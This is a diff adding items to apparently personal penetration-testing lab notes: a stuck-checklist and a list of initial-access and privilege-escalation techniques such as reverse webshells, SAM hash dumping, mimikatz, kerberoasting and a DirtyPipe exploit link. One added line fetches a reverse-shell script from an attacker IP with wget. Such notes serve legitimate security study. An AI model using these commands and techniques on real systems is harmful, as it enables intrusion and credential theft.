@@ -1,5 +1,6 @@
 # FEEL LIKE STUCK???
 - Did we run cmdkey /list?
+- Did we try wget without http:? so "wget 192.168.45.176:443/revlin.sh"
 - Did we try crackmapexec mssql 192.168.x.x ...?
 - Did you try uploading files on inetpub?? ( we can get service account that has seimpersonateprivilege)
 - Did we search cve-2020-xx github, exploit...blahblah?
@@ -26,6 +27,40 @@
 - Can our current system has File Write permission as system?(WerTrigger: https://github.com/sailay1996/WerTrigger)
 - Did we check windows build version?(old versions have exploits)
 - Did I miss $ sign from username? (svc_apache$ not svc_apache)
+
+
+# Exploit I encountered
+
+```bash
+# initial
+website with a url input --> responder
+website with input --> sqli
+ftp where i can upload a reverse webshell
+db file where i had to change its name from db to db.sqlite and check it with the viewer
+.git, .gitconfig
+random ports(3003,3000)
+snmp 161 --> credentials
+
+
+
+# pivoting or privilege escalation
+impacket-getuserspn ( make sure to point at dc)
+internally running service --> check out on running process to find vulnerable service or hints
+windows.old -> download SAM and SYSTEM and use secretsdump to extract hashes
+putty session -> pivot
+mimikatz.exe -> domain credentials
+password inside a config file(coudlnt find with lse.sh but with linpeas)
+scheduled executable path
+able to change executable path i could start
+albe to change executable path i coudln't start but could start with shutdown
+unusual setuid binaries(php, screen)
+sudo -l (gcore)
+credentials from running process!
+cronjob that runs every minute
+kernel exploit(https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
+
+```
+
 
 
 # NMAP tips
